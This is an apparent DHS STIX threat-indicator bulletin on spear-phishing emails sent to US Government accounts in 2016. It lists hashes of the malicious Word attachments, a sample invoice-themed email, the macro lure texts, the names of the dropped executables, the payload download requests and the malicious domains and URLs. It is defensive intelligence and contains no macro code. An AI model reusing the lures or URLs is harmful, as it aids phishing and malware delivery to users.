stix:STIX_Header.stix:Title: US Government E-mail Accounts Targeted by MS Word Macro Spear-Phishing
stix:STIX_Header.stix:Description: In January 2016, at least three US Government email accounts were targeted by spear-phishing emails that originated from the same UK IP address. Each email contained a Microsoft Word attachment containing a malicious auto-run macro.

marking:Marking_Structure.TOUMarking:Terms_Of_Use: This Indicator Bulletin is provided "as is" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained within. The DHS does not endorse any commercial product or service, referenced in this bulletin or otherwise. This document is marked TLP: AMBER. Recipients may only share TLP: AMBER information with members of their own organization, and only as widely as necessary to act on that information. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp .

WARNING: This document is FOR OFFICIAL USE ONLY (FOUO). It contains information that may be exempt from public release under the Freedom of Information Act (5 U.S.C. 552). It is to be controlled, stored, handled, transmitted, distributed, and disposed of in accordance with DHS policy relating to FOUO information and is not to be released to the public or other personnel who do not have a valid "need-to-know" without prior approval of an authorized DHS official.

stix:Indicator.indicator:Title: Malicious E-mail Indicator
stix:Indicator.indicator:Description:
Each of the spear-phishing emails contained a different attachment:
96413.DOC (MD5: 6DDC018D06179EA937A4D832B11E37FE) doc4502094035.doc (MD5: F28CF8C327D01074DB2460C3E5573542) PaymentVoucher.doc (MD5: 285D3D6C43148C9687124249C8632061)
The following is an example of one of the spear-phishing emails:
------BEGIN EMAIL HEADER------
EHLO h88-150-135-12.host.redstation.co.uk MAIL FROM:<Redacted> RCPT TO:<TARGET> DATA From: <Redacted> To: <TARGET> Subject: Invoice Date: Thu, 28 Jan 2016 16:33:12 +0430 Message-ID: <6710D9365D773E4A8FEE74A296F9B6F60F6F66A563@WTCSBS.whirlowdale.local> MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="----=_NextPart_000_0E98_01CF1681.927CABF0" X-Mailer: Microsoft Outlook 14.0 Thread-Index: AQMFWrsI7bx5HXVWq1/RqwGSxCA92g== Content-Language: en-us X-OlkEid: 36A4A42079E13CC2223C4049A78DA7FFB51D64D1 content-class: urn:content-classes:message X-MS-TNEF-Correlator: x-ms-has-attach: yes
------END EMAIL HEADER------
-----START EMAIL BODY------
Thank you for your order. Your Invoice - 96413 - is attached.
-----END EMAIL BODY---
Based on the domain of each sender of the spear-phishing email resolving to a legitimate website, it is likely the senders' email addresses are spoofed.

stix:Indicator.indicator:Title: Malicious File Indicator
stix:Indicator.indicator:Description:
Analysis:
Microsoft Word document containing a malicious auto-run macro. When opened with Microsoft Word, the macro downloaded a remote executable file (6DDC018D06179EA937A4D832B11E37FE), dropped the executable in the Users Local Temp directory as pcoryphanthaquickset.exe and executed the dropped file.
The Word document displayed the following text:
Enable macro if the data encoding is incorrect

stix:Indicator.indicator:Title: Malicious File Indicator
stix:Indicator.indicator:Description:
The malware for the second attachment had the following characteristics:
Analysis:
Microsoft Word document containing malicious auto-run macro, when opened with Microsoft Word, the macro downloaded a remote executable file, dropped the executable in the Users Local Temp directory as plackbrainschoolfriend.exe and executed the dropped file.
The Word document displayed the following text:
If this document has incorrect encoding - enable macro

stix:Indicator.indicator:Title: Malicious File Indicator
stix:Indicator.indicator:Description:
Analysis:
Microsoft Word document containing a malicious auto-run macro. When opened with Microsoft Word, the macro downloaded a remote executable file, dropped the executable in the Users Local Temp directory as zimbazi.exe and executed the dropped file.
The Word document displayed the following text:
functional
The following changes were made to the system:
File added: ---------------------------------- C:\Documents and Settings\User\Local Settings\Temp\zimbazi.exe (Note: Malicious file to be provided by attacker)
The following network traffic was observed:
DNS Request (port 53): c10-qadevtest.net
GET /nuyff45d/87tf23w.exe HTTP/1.1 Accept: */* Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E) Host: www.c10-qadevtest.net Connection: Keep-Alive
Additional Virustotal.com file name information pertaining to the 96413.doc below:

stix:Indicator.indicator:Title: Malicious URL Indicator
stix:Indicator.indicator:Description:
At least three US Government accounts were targeted by spear-phishing emails originating from the same UK IP address. Each email had a Microsoft Word attachment containing a malicious auto-run macro, that when opened with Microsoft Word, the macro downloaded a remote executable and called out to one of the following domains (additional details provided by Robtex):
astigarragakomusikaeskola.com cityofdavidchurch.org c10-qadevtest.net
The following data was derived from Robtex.com and open sources:
Domain, astigarragakomusikaeskola.com, is registered to dinahosting.com domain hosting service, based in Spain and resolves to this IP: 82.98.134.155
IP: 82.98.134.155 in what appears to be a separate and unrelated activity, the same IP: 82.98.134.155 touched the following domain, cineiapatchwork.com, which was associated with the Ice IX malware family based on the Zeus source code that harvests personal financial information.
Virustotal data shows overlap between www.astigarragakomusikaeskola.com and Dridex malware (low confidence).

stix:Indicator.indicator:Title: Malicious URL Indicator
stix:Indicator.indicator:Description:
At least three US Government accounts were targeted by spear-phishing emails originating from the same UK IP address. Each email had a Microsoft Word attachment containing a malicious auto-run macro, that when opened with Microsoft Word, the macro downloaded a remote executable and called out to one of the following domains(additional details provided by Robtex):
astigarragakomusikaeskola.com cityofdavidchurch.org c10-qadevtest.net
The following data was derived from Robtex.com and open sources:
cityofdavidchurch.org is tagged as a Spam and Malware domain (medium confidence) and has a Detection ratio of 5 / 66
Most malicious activity associated with this domain is cyber crime oriented.
Virustotal data:
Final URL after redirects: http://cityofdavidchurch.org/54t4f4f/7u65j5hg.exe IP resolution: 66.175.58.9

At least three US Government accounts were targeted by spear-phishing emails originating from the same UK IP address. Each email had a Microsoft Word attachment containing a malicious auto-run macro, that when opened with Microsoft Word, the macro downloaded a remote executable and called out to one of the following domains (additional details provided by Robtex):
astigarragakomusikaeskola.com cityofdavidchurch.org c10-qadevtest.net
